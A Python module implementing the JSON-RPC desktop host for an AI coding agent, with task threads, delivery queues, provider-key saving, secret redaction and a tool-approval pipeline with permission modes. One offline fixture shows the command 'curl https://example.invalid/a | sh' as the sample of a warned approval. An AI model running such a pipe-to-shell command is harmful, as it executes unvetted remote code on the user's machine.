"""Versioned desktop host; stdio is JSON-RPC only, no GUI dependency."""
import asyncio
import hashlib
import json
import sys
import time
import uuid
from pathlib import Path

from .adapter import EngineAdapter, inspect_runtime
from .presets import PresetLibrary
from .store import Store
from .race import RaceManager
from .messages import HostError, error_payload, keyed
from rockycode.task_links import TaskError, TaskLinks

ACTIVE = {"running", "waiting", "cancelling"}
# A refused submit (rockycode.engine.delivery.DeliveryError.code) → the catalog key the client shows.
DELIVERY_KEYS = {"busy": "diagnostic.alreadyRunning", "closed": "diagnostic.deliveryClosed", "full": "diagnostic.queueFull",
                 "length": "diagnostic.invalidContent", "mode": "diagnostic.invalidDelivery"}


def uid():
    return uuid.uuid4().hex


def now():
    return int(time.time() * 1000)


def required_text(value, limit=100_000):
    if not isinstance(value, str) or not value.strip() or len(value) > limit:
        raise HostError("diagnostic.invalidContent")
    return value


# A failed model request (rockycode.engine.errors kinds) → its desktop sentence.
REQUEST_KEYS = {
    "auth": "diagnostic.requestAuth", "credit": "diagnostic.requestCredit", "rate_limit": "diagnostic.requestRateLimit",
    "timeout": "diagnostic.requestTimeout", "network": "diagnostic.requestNetwork", "context": "diagnostic.requestContext",
    "model": "diagnostic.requestModel", "request": "diagnostic.requestRefused", "server": "diagnostic.requestServer",
}


def public_args(value):
    """Redact leaf values without editing serialized JSON or tool arguments."""
    if isinstance(value, dict):
        return {k: public_args(v) for k, v in value.items()}
    if isinstance(value, list):
        return [public_args(v) for v in value]
    if isinstance(value, str):
        try:
            from rockycode.engine.redact import redact
            return redact(value)
        except ImportError:
            pass
    return value


# The desktop is a host of the shared approval pipeline (rockycode.engine.approval),
# per task: "ask" is the TUI-parity default (safe reads and in-workdir writes pass
# silently, risky tools ask), "yolo" auto-approves everything except block-tier
# commands, "careful" asks for every risky/moderate call. Exposed via mode/set.
# yolo never waits: a call only the user can allow is refused at once and kept in
# thread["parked"] for them to decide (parked/decide), as in the TUI.
PERMISSION_MODES = ("careful", "ask", "yolo")
# The task store's refusal codes, rendered from the desktop catalog (never its English).
TASK_KEYS = {"unknown_task": "diagnostic.taskUnknown", "cross_workspace": "diagnostic.taskWorkspace",
             "inbox_full": "diagnostic.taskInboxFull", "text_size": "diagnostic.taskText",
             "self_target": "diagnostic.taskSelf", "unknown_message": "diagnostic.taskMessageUnknown",
             "invalid_draft": "diagnostic.invalidContent"}
DERIVED = ("parentTaskId", "taskInbox")  # read from the task store on demand; never persisted with the thread


class Host:
    def __init__(self, directory, fixture=False, emit=None):
        self.store = Store(directory)
        self.links = TaskLinks(Path(directory) / "task-links.sqlite3")
        self.presets = PresetLibrary(directory)
        self.fixture = fixture
        self.runtime = inspect_runtime(fixture)
        self.threads = {t["id"]: t for t in self.store.all()}
        self.tasks = {}
        self.deliveries = {}
        self.adapters = {}
        self.approvals = {}
        self.startup_grants = set()  # exact config + workspace, this app run only
        self.approvers = {}  # thread id → ToolApprover; its session grants last this app run
        self.pickups = {}  # delivery id of the message that tells rocky to run a parked step → (thread id, step)
        self.emit = emit or (lambda event: None)
        self.races = RaceManager(self.store, directory, fixture, self.emit)
        for thread in self.threads.values():
            self.links.register(thread["id"], thread["workspace"], thread["title"])
            # Pin legacy tasks to the launch default once, then persist per task.
            if "model" not in thread:
                thread["model"] = self.runtime.get("model", "")
                self.store.save(thread)
            # Keep submitted text across restart, never replay it unattended.
            delivery = thread.setdefault("delivery", {"pending": [], "paused": False})
            active = delivery.get("active")
            if active and not any(m.get("deliveryId") == active["id"] for m in thread["messages"]):
                # Crash between queue claim and transcript checkpoint: retain text.
                delivery["pending"].insert(0, active)
            delivery["active"] = None
            if delivery["pending"]:
                delivery["paused"] = True
            # A step parked in an earlier app run cannot be decided: its exact call lived in that process.
            stale = bool(thread.get("parked"))
            thread["parked"] = []
            if thread["status"] in ACTIVE:
                thread["status"] = "interrupted"
                thread["approval"] = None
                for msg in thread["messages"]:
                    if msg["status"] == "streaming":
                        msg["status"] = "interrupted"
                    for tool in msg.get("tools", []):
                        if tool["status"] == "running":
                            tool["status"] = "interrupted"
                self.store.save(thread)
            elif delivery["pending"] or stale:
                self.store.save(thread)

    def snapshot(self):
        self.refresh_links(publish=False)
        return {"protocolVersion": 1, "runtime": self.runtime, "threads": sorted(self.threads.values(), key=lambda t: t["updatedAt"], reverse=True), "presets": self.presets.list()}

    def refresh_links(self, *ids, publish=True):
        """Derive the link fields of the given threads (all when none are named)
        from the task store, publishing only those threads."""
        threads = [self.threads[i] for i in ids if i in self.threads] if ids else list(self.threads.values())
        for thread in threads:
            linked = self.links.get(thread["id"])
            thread["parentTaskId"] = linked["parent"]
            thread["taskInbox"] = self.links.inbox(thread["id"])
            if publish:
                self.publish(thread)

    async def create_task(self, parent, prompt):
        from rockycode.task_links import task_text
        prompt = task_text(prompt)
        return self.create_thread(parent["workspace"], parent=parent, prompt=prompt)

    def create_thread(self, workspace, *, parent=None, prompt=""):
        workspace = Path(required_text(workspace, 4096)).resolve()
        if not workspace.is_dir():
            raise HostError("diagnostic.workspaceMissing")
        thread = {"id": uid(), "title": prompt.strip().replace("\n", " ")[:36], "workspace": str(workspace),
                  "updatedAt": now(), "messages": [], "note": "", "draft": prompt, "status": "idle",
                  "runId": None, "approval": None, "parked": [], "tools": [],
                  "permissionMode": "careful" if (parent and parent.get("permissionMode") == "careful")
                  or self._configured_careful(workspace) else "ask",
                  "model": parent["model"] if parent else self.runtime.get("model", "")}
        self.links.register(thread["id"], workspace, thread["title"], parent=parent["id"] if parent else None)
        self.threads[thread["id"]] = thread
        self.save(thread)
        self.refresh_links(thread["id"])
        return thread

    def _configured_careful(self, workspace):
        """Did the user choose `permission = "careful"` (global config, or this
        project's)? Config can tighten a new task's mode, never loosen it."""
        if self.fixture:
            return False
        try:
            from rockycode.config import load
            return load(workspace).get("permission") == "careful"
        except Exception:  # noqa: BLE001 — an unreadable config must not block a task
            return False

    async def _task_method(self, method, thread, params):
        if method == "task/create":
            return await self.create_task(thread, params.get("prompt"))
        if method == "task/send":
            target = self.thread(params.get("target"))
            receipt = self.links.send(thread["id"], target["id"], params.get("message"))
            self.refresh_links(target["id"])
            return receipt
        removed = self.links.dismiss(thread["id"], params.get("messageId"))
        self.refresh_links(thread["id"])
        return {"removed": removed}

    def publish(self, thread, kind="thread", **data):
        self.emit({"type": kind, "threadId": thread["id"], "runId": thread.get("runId"), **({"thread": thread} if kind == "thread" else data)})

    def save(self, thread, history=None):
        self.store.save({key: value for key, value in thread.items() if key not in DERIVED}, history)

    def thread(self, thread_id):
        if thread_id not in self.threads:
            raise HostError("diagnostic.sessionMissing")
        return self.threads[thread_id]

    def delivery(self, thread):
        from rockycode.engine.delivery import TurnDelivery
        if thread["id"] not in self.deliveries:
            def changed():
                thread["delivery"] = self.deliveries[thread["id"]].snapshot()
                self.save(thread)
                self.publish(thread)

            async def run(item):
                return await self.run_message(thread, item)

            self.deliveries[thread["id"]] = TurnDelivery(
                run, on_change=changed, pending=thread.get("delivery", {}).get("pending", []))
        return self.deliveries[thread["id"]]

    async def run_message(self, thread, item):
        prompt = item.prompt
        thread.update(status="running", runId=uid(), updatedAt=now(), approval=None)
        if not thread["messages"]:
            thread["title"] = prompt.strip().replace("\n", " ")[:36]
        thread["messages"].extend([
            {"id": uid(), "deliveryId": item.id, "role": "user", "content": prompt, "status": "complete", "tools": []},
            {"id": uid(), "role": "assistant", "content": "", "reasoning": "", "status": "streaming", "tools": []},
        ])
        self.save(thread)
        self.publish(thread)
        self.tasks[thread["id"]] = asyncio.current_task()
        # The step the user allowed may run in THIS turn, the one that asks for it, and in no other:
        # a message that is never delivered arms nothing.
        steps = [self.pickups.pop(item.id)[1]] if item.id in self.pickups else []
        approver = self.approvers.get(thread["id"])
        if approver is not None:
            approver.arm(steps)
        try:
            await self.run(thread, prompt)
        finally:
            if approver is not None:
                approver.disarm(steps)  # a pass the turn did not use ends with it
        last = thread["messages"][-1]
        # A turn stopped at the park limit holds the queue for the user, as a stopped turn does.
        return last["status"] == "complete" and last.get("error_key") != "diagnostic.parkStopped"

    async def dispatch(self, method, params):
        if not isinstance(params, dict):
            raise HostError("diagnostic.invalidRequest")
        if isinstance(method, str) and method.startswith("race/"):
            return await self.races.dispatch(method, params)
        if method == "initialize":
            return self.snapshot()
        if method == "thread/create":
            return self.create_thread(params.get("workspace"))
        if isinstance(method, str) and method.startswith("preset/"):
            return self._presets(method, params)
        if method == "models/list":
            return {"model": self.runtime.get("model") or "", "models": self._model_choices()}
        if method == "setup/providers":
            return {"providers": self._key_providers(), "keychain": self._keychain()}
        if method == "setup/saveKey":
            return await self._save_key(params)
        thread = self.thread(params.get("threadId"))
        if method in {"task/create", "task/send", "task/dismiss"}:
            try:
                return await self._task_method(method, thread, params)
            except TaskError as exc:
                raise HostError(TASK_KEYS.get(exc.code, "diagnostic.invalidRequest"), **exc.params) from exc
        if method in {"draft/save", "note/save"}:
            text = params.get("content")
            if not isinstance(text, str) or len(text) > 1_000_000:
                raise HostError("diagnostic.documentTooLarge")
            field = "draft" if method == "draft/save" else "note"
            thread[field] = text
            self.save(thread)
            return {"saved": True}
        if method == "artifact/read":
            from .artifacts import read_artifact
            return read_artifact(thread["workspace"], params.get("path"))
        if method == "mode/set":
            mode = params.get("mode")
            if mode not in PERMISSION_MODES:
                raise HostError("diagnostic.invalidMode")
            previous = thread.get("permissionMode") or "ask"
            approver = self.approvers.get(thread["id"])
            if PERMISSION_MODES.index(mode) < PERMISSION_MODES.index(previous):
                # Tightening revokes session grants and widened read scopes, as in the TUI.
                if approver is not None:
                    approver.session.clear()
                    approver.once.clear()  # and a pass a pick-up turn holds right now
                engine = getattr(self.adapters.get(thread["id"]), "engine", None)
                if engine is not None:
                    engine.read_grants.clear()
            if approver is not None:
                approver.mode = mode
            thread["permissionMode"] = mode
            self.save(thread)
            self.publish(thread)
            return {"mode": mode}
        if method == "model/set":
            model = required_text(params.get("model"), 200).strip()
            choice = next((m for m in self._model_choices() if m["id"] == model), None)
            if choice is None or not choice["configured"]:
                raise HostError("diagnostic.modelNotConfigured")
            if thread["status"] in ACTIVE:
                raise HostError("diagnostic.modelSwitchWhileRunning")
            if thread.get("model") == model:
                return {"model": model}
            adapter = self.adapters.pop(thread["id"], None)
            thread["model"] = model
            self.save(thread)
            self.publish(thread)
            # Never mutate process env, CLI defaults or another task's adapter.
            if adapter is not None:
                await asyncio.wait_for(adapter.close(), 15)
            return {"model": model}
        if method == "thread/rename":
            title = required_text(params.get("title"), 200).strip().replace("\n", " ")
            thread["title"] = title
            self.links.register(thread["id"], thread["workspace"], title)
            thread["updatedAt"] = now()
            self.save(thread)
            self.publish(thread)
            return {"renamed": True}
        if method == "thread/delete":
            if thread["status"] in ACTIVE:
                raise HostError("diagnostic.deleteWhileRunning")
            delivery = self.deliveries.pop(thread["id"], None)
            if delivery is not None:
                await delivery.close()
            adapter = self.adapters.pop(thread["id"], None)
            if adapter is not None:
                try:
                    await asyncio.wait_for(adapter.close(), 15)
                except Exception:
                    pass
            self.pickups = {key: value for key, value in self.pickups.items() if value[0] != thread["id"]}
            self.approvers.pop(thread["id"], None)
            self.threads.pop(thread["id"])
            self.store.delete(thread["id"])
            self.links.delete(thread["id"])
            self.refresh_links()
            return {"deleted": True}
        if method == "turn/start":
            if not self.runtime["available"]:
                raise HostError(self.runtime.get("error_key") or "diagnostic.runtimeUnavailable")
            prompt = required_text(params.get("prompt"))
            if not Path(thread["workspace"]).is_dir():
                raise HostError("diagnostic.workspaceInaccessible")
            from rockycode.engine.delivery import DeliveryError
            try:
                receipt = await self.delivery(thread).submit(prompt, mode=params.get("delivery", "reject"))
            except DeliveryError as exc:
                raise HostError(DELIVERY_KEYS.get(exc.code, "diagnostic.invalidRequest")) from exc
            if thread["draft"] == prompt:
                thread["draft"] = ""
                self.save(thread)
            # Enter run() before a cancellation request can arrive, so its finally
            # always persists a terminal state (including immediate stop/quit).
            await asyncio.sleep(0)
            return {"runId": thread["runId"], **receipt}
        if method == "turn/cancel":
            if thread["id"] in self.tasks:
                thread["status"] = "cancelling"
                self.publish(thread)
            return {"cancelled": await self.delivery(thread).stop()}
        if method == "turn/resume":
            await self.delivery(thread).resume()
            return {"resumed": True}
        if method == "turn/dequeue":
            removed = await self.delivery(thread).remove(params.get("messageId"))
            self._unsent_pickups(thread)
            return {"removed": removed}
        if method == "turn/clear":
            await self.delivery(thread).clear()
            self._unsent_pickups(thread)
            return {"cleared": True}
        if method == "parked/decide":
            return await self._decide_parked(thread, params)
        if method == "approval/respond":
            request = thread.get("approval")
            if not request or request["id"] != params.get("approvalId"):
                raise HostError("diagnostic.approvalExpired")
            future = self.approvals.get(request["id"])
            if not future or future.done():
                raise HostError("diagnostic.approvalExpired")
            decision = params.get("decision")
            if decision not in ("once", "session", "deny"):
                # Legacy boolean clients (older renderer) map onto the same states.
                allowed = params.get("allowed")
                if type(allowed) is not bool:
                    raise HostError("diagnostic.approvalDecision")
                decision = "once" if allowed else "deny"
            future.set_result(decision)
            return {"accepted": True}
        raise HostError("diagnostic.unknownMethod")

    def _presets(self, method, params):
        if method == "preset/list":
            return {"presets": self.presets.list()}
        if method == "preset/save":
            saved = self.presets.save(params)
            return {"preset": saved, "presets": self.presets.list()}
        if method == "preset/delete":
            self.presets.delete(params.get("id"))
            return {"deleted": True, "presets": self.presets.list()}
        raise HostError("diagnostic.unknownMethod")

    def _key_rows(self):
        """Every endpoint a key can be saved for — the list the TUI's key picker shows."""
        from rockycode.engine import providers
        return providers.key_rows()

    def _keychain(self) -> bool:
        """Is there an OS keychain a key can be kept in? Then the form offers it first."""
        if self.fixture:
            return False
        from rockycode import onboarding
        return onboarding.keychain_available()

    def _key_providers(self):
        if self.fixture:
            return []
        from urllib.parse import urlsplit
        from rockycode import onboarding
        return [{"id": e.eid, "label": p.label + (f" · {e.label}" if e.label else ""),
                 "host": urlsplit(e.base_url).hostname or e.base_url, "configured": e.key() is not None,
                 # where the key lives (keychain · file · shell) — a label, never the value
                 "place": onboarding.key_place(e.key_source() or e.key_env) if e.key() is not None else ""}
                for p, e in self._key_rows()]

    async def _save_key(self, params):
        """Add or replace one provider key from inside the app: test it with the
        first run's free call, save it with the core's saver (the OS keychain
        when the form asks for it and the machine has one; else the 0600 key
        file, every other line kept), then look again for a model that can run.
        A keychain that does not take the key saves nothing and says so: the
        plain-text file is the user's own choice, by unticking the box.
        The key passes through and is gone: the desktop never stores, logs or
        echoes it."""
        if self.fixture:
            raise HostError("diagnostic.keyProvider")
        endpoint = required_text(params.get("endpoint"), 64)
        key = required_text(params.get("key"), 512).strip()
        row = next(((p, e) for p, e in self._key_rows() if e.eid == endpoint), None)
        if row is None or not key:
            raise HostError("diagnostic.keyProvider")
        from rockycode import onboarding
        ep = row[1]
        verdict = await asyncio.to_thread(onboarding.probe_key, key, ep.base_url)
        if verdict == "rejected":
            raise HostError("diagnostic.keyRejected")
        keychain = params.get("keychain") is True
        try:
            # The keychain can ask (an OS dialog) and take its time: off the event loop.
            where = await asyncio.to_thread(onboarding.save_key, ep.key_env, key, prefer_keyring=keychain)
        except onboarding.KeychainRefused:
            raise HostError("diagnostic.keychainRefused") from None
        except OSError:
            raise HostError("diagnostic.keyUnsaved") from None
        in_keychain = where == onboarding.KEYCHAIN
        # A task that is not running reopens its client on its next turn, with the new key.
        for thread_id in [i for i, t in self.threads.items() if i in self.adapters and t["status"] not in ACTIVE]:
            try:
                await asyncio.wait_for(self.adapters.pop(thread_id).close(), 15)
            except Exception:  # noqa: BLE001 — a stale client must not block the key
                pass
        self.runtime = inspect_runtime(self.fixture)
        return {"runtime": self.runtime, "verified": verdict == "ok",
                "place": "keychain" if in_keychain else "file"}

    def _model_choices(self):
        """The shared catalog's keyed choices — the same short list the TUI
        model picker shows (deepseek always included; it rides the default key)."""
        if self.fixture:
            return [{"id": "fixture:" + name, "label": "Fixture " + name, "configured": True, "vision": False}
                    for name in ("fast", "reasoning")]
        try:
            from rockycode.engine.providers import configured_choices
        except ImportError:
            return []
        return [
            {"id": choice.id, "label": f"{choice.prov_id} · {getattr(choice.spec, 'label', '') or choice.model}",
             "configured": bool(choice.configured), "vision": bool(choice.vision)}
            for choice in configured_choices()
        ]

    async def approve(self, thread, tool, args):
        """The human decisions that live outside the engine's pipeline: starting
        an external MCP/LSP process (its own consent, asked even in yolo; a
        "session" answer is remembered for this exact config + workspace, this
        app run only) and the fixture's stand-in tool. A live task's engine
        tool calls never come here — its engine carries the shared ToolApprover
        (see _approver), so the static policy, binary-scoped session grants and
        the verifier behave exactly as in the TUI and `serve`."""
        if tool in {"runtime.start_mcp", "runtime.start_lsp"}:
            identity = hashlib.sha256(json.dumps([tool, thread["workspace"], args], sort_keys=True).encode()).hexdigest()
            if identity in self.startup_grants:
                return True
            # Starting an external process is a separate decision from tool calls,
            # including in yolo. A grant never covers another server/config.
            decision = await self._prompt_approval(thread, tool, args, str(args.get("server") or args.get("command") or tool))
            if decision == "session":
                self.startup_grants.add(identity)
            return decision in {"once", "session"}
        approver = self.approvers.get(thread["id"])
        if approver is not None:
            return await approver(tool, args)
        # Fixture (no engine): no policy, no grants — just the human's answer.
        decision = await self._prompt_approval(thread, tool, args, None)
        return decision in ("once", "session")

    def _approver(self, thread, engine):
        """The shared approval pipeline with this task's permission mode and the
        renderer as the human: static policy → session grants → verifier → the
        approval card. One per task for the app run, so session grants survive
        the engine being rebuilt after a stop or an error. What the pipeline
        decides on its own (a static block, the verifier's auto allow/deny) is
        marked on the running tool row for the renderer to say so."""
        from rockycode.engine.approval import ToolApprover
        approver = self.approvers.get(thread["id"])
        if approver is None:
            async def ask(req):
                return await self._prompt_approval(thread, req.tool, req.args, req.session_grant, req.warning)

            async def notify(kind, **info):
                if kind == "parked":
                    self._list_parked(thread)
                self._approval_note(thread, kind, info.get("tool"))

            approver = ToolApprover(registry=engine.registry, workdir=engine.workdir, ask=ask, notify=notify,
                                    mode=thread.get("permissionMode") or "ask", engine=engine,
                                    park=True)  # yolo never waits: thread["parked"] is the waiting list
            self.approvers[thread["id"]] = approver
        else:
            approver.engine, approver.registry, approver.workdir = engine, engine.registry, engine.workdir
            approver.mode = thread.get("permissionMode") or "ask"
        if getattr(engine, "file_access", None) is not None:
            engine.file_access.local_mode = lambda: approver.mode
        engine.approver = approver
        return approver

    def _list_parked(self, thread):
        """thread["parked"]: what the client shows of the approver's waiting list. The step in
        plain words with secrets masked; the call's own arguments stay inside the core."""
        from rockycode.engine.redact import redact
        approver = self.approvers.get(thread["id"])
        thread["parked"] = [{"id": step.id, "tool": step.tool, "detail": redact(step.detail), "warning": step.warning,
                             "at": int(step.at * 1000)} for step in (approver.parked if approver else [])]
        self.save(thread)

    def _unsent_pickups(self, thread):
        """A pick-up message the user took out of the queue told rocky nothing: its step
        waits again, instead of vanishing with it."""
        approver = self.approvers.get(thread["id"])
        delivery = self.deliveries.get(thread["id"])
        queued = {item.id for item in delivery.pending} if delivery else set()
        if delivery is not None and delivery.current is not None:
            queued.add(delivery.current.id)
        for message_id, (owner, step) in list(self.pickups.items()):
            if owner == thread["id"] and message_id not in queued:
                del self.pickups[message_id]
                if approver is not None:
                    approver.parked.append(step)
        self._list_parked(thread)
        self.publish(thread)

    async def _decide_parked(self, thread, params):
        """The user's answer to a parked step. run: `prompt` (the client's sentence, in
        its language) is queued to tell rocky to pick it up — after a running turn, never
        interrupting it — and the pass for exactly that call is armed when that message's
        turn starts (run_message). skip: off the list."""
        decision = params.get("decision")
        if decision not in ("run", "skip"):
            raise HostError("diagnostic.invalidRequest")
        if self.fixture:
            return await self._decide_parked_fixture(thread, params)
        approver = self.approvers.get(thread["id"])
        step = next((p for p in (approver.parked if approver else []) if p.id == params.get("stepId")), None)
        if step is None:
            raise HostError("diagnostic.parkedGone")
        if decision == "run":
            prompt = required_text(params.get("prompt"))
            from rockycode.engine.delivery import DeliveryError
            try:
                receipt = await self.delivery(thread).submit(prompt, mode="queue")
            except DeliveryError as exc:  # rocky was not told, so the step waits on
                raise HostError(DELIVERY_KEYS.get(exc.code, "diagnostic.invalidRequest")) from exc
            # No await between the submit and this line: the queue's task has not started the message yet.
            self.pickups[receipt["message_id"]] = (thread["id"], step)
            approver.settle(step)
            await asyncio.sleep(0)  # as turn/start: the run has begun before the client can act on the reply
        else:
            approver.settle(step)
            adapter = self.adapters.get(thread["id"])
            if adapter is not None and thread["status"] not in ACTIVE and not self.delivery(thread).running:
                # rocky should not go on thinking the step still waits.
                from rockycode.engine.redact import redact
                adapter.engine._append({"role": "user", "content":
                                        f"[the user decided not to run this parked step: {step.tool} {redact(step.detail)}]"})
                self.save(thread, adapter.history)
        self._list_parked(thread)
        self.publish(thread)
        return {"parked": len(thread["parked"])}

    async def _decide_parked_fixture(self, thread, params):
        rows = thread.get("parked") or []
        if not any(row["id"] == params.get("stepId") for row in rows):
            raise HostError("diagnostic.parkedGone")
        thread["parked"] = [row for row in rows if row["id"] != params.get("stepId")]
        self.save(thread)
        self.publish(thread)
        if params.get("decision") == "run":
            await self.delivery(thread).submit(required_text(params.get("prompt")), mode="queue")
        return {"parked": len(thread["parked"])}

    def _approval_note(self, thread, kind, tool):
        """`kind` is blocked | auto_allowed | auto_denied | parked for the tool call that is running now."""
        message = thread["messages"][-1] if thread["messages"] else None
        for row in reversed(message["tools"] if message else []):
            if row["status"] == "running" and row["name"] == tool:
                row["decision"] = kind
                break
        self.publish(thread)

    async def _prompt_approval(self, thread, tool, args, session_label, warning=None):
        # Every invocation is bound to its actual args and current run.
        approval_id = uid()
        future = asyncio.get_running_loop().create_future()
        self.approvals[approval_id] = future
        # Display a redacted copy; the original args stay inside the core.
        request = {"id": approval_id, "tool": tool, "args": public_args(args), "sessionLabel": session_label, "expiresAt": int(time.time() * 1000) + 300_000}
        if warning:
            request["warning"] = warning
        thread.update(status="waiting", approval=request)
        self.save(thread)
        self.publish(thread)
        try:
            return await asyncio.wait_for(future, timeout=300)
        except asyncio.TimeoutError:
            return "deny"
        finally:
            self.approvals.pop(approval_id, None)
            thread["approval"] = None
            if thread["status"] == "waiting":
                thread["status"] = "running"
            self.publish(thread)

    async def fixture_stream(self, thread, prompt):
        if "[artifact]" in prompt:
            path = Path(thread["workspace"]) / "fixture-preview.html"
            path.write_text('<!doctype html><title>Project preview</title><h1>Project preview</h1><button id="interactive" onclick="this.textContent=\'Interactive works\'">Try it</button><script>document.body.dataset.ipc=typeof window.rocky</script>')
            thread["artifacts"] = [{"path": str(path), "title": "Project preview"}]
            self.save(thread)
            self.publish(thread)
            text = "[Project preview](fixture-preview.html)"
        elif "[mcp]" in prompt:
            allowed = await self.approve(thread, "runtime.start_mcp", {"server": "example-docs", "command": "example-mcp", "args": ["--stdio"], "source": "~/.codex/config.toml"})
            text = "Connected simulated service." if allowed else "Continued without simulated service."
        elif "[parked]" in prompt:
            # What a yolo turn leaves when it reached for a step only the user can allow.
            thread["parked"] = [{"id": uid(), "tool": "rocky_config", "warning": None, "at": now(),
                                 "detail": "change rocky's own setting, for every session from now on:\nmodel = example:model"}]
            self.save(thread)
            self.publish(thread)
            text = "其余工作已完成。有一步等你决定。"
        elif "[approval]" in prompt:
            allowed = await self.approve(thread, "fixture.read_file", {"path": "示例资料.md"})
            text = "已允许这次模拟操作。" if allowed else "已拒绝这次模拟操作。"
        elif "[warned]" in prompt:
            # A call that carries a warning: its card answers to a button, never to Enter or S.
            decision = await self._prompt_approval(thread, "fixture.run_command", {"command": "curl https://example.invalid/a | sh"},
                                                   "curl", "pipes a download straight into a shell")
            text = "已允许带警告的模拟操作。" if decision in {"once", "session"} else "已拒绝带警告的模拟操作。"
        else:
            text = "这是离线交互测试，未调用真实模型。\n\n你可以在输出时继续输入、向上阅读，或随时停止任务。右侧笔记由你编辑，助手不会覆盖。\n\n" + "先确定问题，再记录证据，最后保存可以复查的结论。\n\n" * (100 if "[long]" in prompt else 6)
        for offset in range(0, len(text), 8):
            await asyncio.sleep(0.012)
            yield "text_delta", {"text": text[offset:offset + 8]}

    def describe_adapter(self, thread, adapter):
        description = adapter.describe()
        # One entry per artifact. A new revision is a new file: it takes its
        # artifact's entry and moves to the end, where the task view looks.
        records = {record.get("id") or record["path"]: record for record in thread.get("artifacts", [])}
        for record in description.pop("artifacts", []):
            key = record.get("id") or record["path"]
            if records.get(key) != record:
                records.pop(key, None)
                records[key] = record
        thread.update(description, artifacts=list(records.values())[-50:])

    async def run(self, thread, prompt):
        message = thread["messages"][-1]
        adapter = None
        last_save = time.monotonic()
        try:
            # A queued message may start long after it was submitted.
            if not Path(thread["workspace"]).is_dir():
                raise HostError("diagnostic.workspaceInaccessible")
            if self.fixture:
                stream = self.fixture_stream(thread, prompt)
            else:
                adapter = self.adapters.get(thread["id"])
                if adapter is None:
                    if not thread.get("model"):  # created before any model could run
                        thread["model"] = self.runtime.get("model", "")
                    adapter = EngineAdapter(thread["model"], thread["workspace"], self.store.history(thread["id"]), lambda name, args: self.approve(thread, name, args))
                    self.adapters[thread["id"]] = adapter
                    from rockycode.task_links import build_task_tools

                    async def create(prompt):
                        child = await self.create_task(thread, prompt)
                        return {"task_id": child["id"], "status": "draft", "parent": thread["id"]}

                    adapter.engine.registry.update(build_task_tools(self.links, thread["id"], create, self.refresh_links))
                    adapter.runtime.refresh_prompt()
                    self._approver(thread, adapter.engine)
                self.describe_adapter(thread, adapter)
                self.publish(thread)
                await adapter.start()
                self.describe_adapter(thread, adapter)
                self.publish(thread)
                stream = adapter.stream(prompt)
            async for kind, data in stream:
                if kind in {"text_delta", "thinking_delta"}:
                    field = "content" if kind == "text_delta" else "reasoning"
                    delta = data["text"]
                    message[field] = message.get(field, "") + delta
                    self.publish(thread, "delta", messageId=message["id"], field=field, delta=delta)
                elif kind == "tool_started":
                    # `detail`: what the call acts on (the command, the file, the query), one
                    # line, secrets masked — a row that only said "bash · Finished" could not be checked.
                    from rockycode.engine.approval import tool_brief
                    message["tools"].append({"id": data["call_id"], "name": data["tool"], "status": "running", "output": "",
                                             "detail": tool_brief(data["tool"], data.get("args") or {}, limit=160)})
                    self.save(thread, adapter.history if adapter else None)
                    self.publish(thread)
                elif kind == "tool_finished":
                    if adapter:
                        self.describe_adapter(thread, adapter)
                    for tool in message["tools"]:
                        if tool["id"] == data["call_id"]:
                            tool.update(status="complete" if data["ok"] else "error", output=data["output"][:12000])
                    self.save(thread, adapter.history if adapter else None)
                    self.publish(thread)
                if time.monotonic() - last_save >= 0.5:
                    self.save(thread, adapter.history if adapter else None)
                    last_save = time.monotonic()
            approver = None if self.fixture else self.approvers.get(thread["id"])
            if approver is not None and approver.stop_turn:
                # The engine ended the turn at the park limit: say so on the message (and run_message holds the queue).
                message.update(keyed("diagnostic.parkStopped", count=approver.turn_parks))
            thread["status"] = "idle"
            message["status"] = "complete"
        except asyncio.CancelledError:
            thread["status"] = "idle"
            message["status"] = "cancelled"
            for tool in message["tools"]:
                if tool["status"] == "running":
                    tool["status"] = "cancelled"
        except Exception as exc:
            thread["status"] = "error"
            message["status"] = "error"
            if isinstance(exc, HostError):
                message.update(keyed(exc.key, **exc.params))
            elif getattr(exc, "kind", "") in REQUEST_KEYS:  # a failed model request, by kind
                message.update(keyed(REQUEST_KEYS[exc.kind], **exc.params))
            elif getattr(exc, "key_env", ""):  # engine/route.py RouteError: this model has no key
                from rockycode import onboarding
                # A key the keychain holds and did not give is not a key never added.
                silent = exc.key_env in onboarding.keychain_silent()
                message.update(keyed("diagnostic.modelKeychainSilent" if silent else "diagnostic.modelNoKey",
                                     model=thread.get("model") or "", variable=exc.key_env))
            else:
                try:
                    from rockycode.engine.redact import redact
                    message["error"] = redact(str(exc))[:1000]   # provider text, shown as is
                except ImportError:
                    message.update(keyed("diagnostic.taskIncomplete"))
        finally:
            thread["approval"] = None
            thread["updatedAt"] = now()
            try:
                self.save(thread, adapter.history if adapter else None)
            except Exception:
                thread["status"] = "error"
                message["status"] = "error"
                message.update(keyed("diagnostic.historySave"))
            if adapter and message["status"] != "complete":
                # Keep healthy sessions warm between turns. Cancellation/error
                # discards external actors so an interrupted MCP call cannot
                # block the next turn; history has already been checkpointed.
                self.adapters.pop(thread["id"], None)
                try:
                    await asyncio.wait_for(adapter.close(), 15)
                except Exception:
                    message.update(keyed("diagnostic.cleanupAfterStop"))
            self.tasks.pop(thread["id"], None)
            self.publish(thread)

    async def close(self):
        await self.races.close()
        await asyncio.gather(*(d.close() for d in self.deliveries.values()))
        tasks = list(self.tasks.values())
        for task in tasks:
            task.cancel()
        if tasks:
            await asyncio.gather(*tasks, return_exceptions=True)
        await asyncio.gather(*(a.close() for a in self.adapters.values()), return_exceptions=True)
        self.adapters.clear()
        self.links.close()
        self.store.close()


def write(message):
    sys.stdout.write(json.dumps(message, ensure_ascii=False) + "\n")
    sys.stdout.flush()


async def serve(directory, fixture=False):
    host = Host(directory, fixture, emit=lambda e: write({"jsonrpc": "2.0", "method": "event", "params": e}))
    try:
        while True:
            line = await asyncio.to_thread(sys.stdin.readline)
            if not line:
                break
            request = None
            try:
                if len(line) > 2_000_000:
                    raise HostError("diagnostic.requestTooLarge")
                request = json.loads(line)
                if not isinstance(request, dict) or request.get("jsonrpc") != "2.0":
                    raise HostError("diagnostic.invalidProtocol")
                if request.get("method") == "shutdown":
                    await host.close()
                    write({"jsonrpc": "2.0", "id": request.get("id"), "result": {"closed": True}})
                    return
                result = await host.dispatch(request.get("method"), request.get("params", {}))
                write({"jsonrpc": "2.0", "id": request.get("id"), "result": result})
            except Exception as exc:
                write({"jsonrpc": "2.0", "id": request.get("id") if isinstance(request, dict) else None, "error": error_payload(exc)})
    finally:
        if host.store.db:
            try:
                await host.close()
            except Exception:
                pass
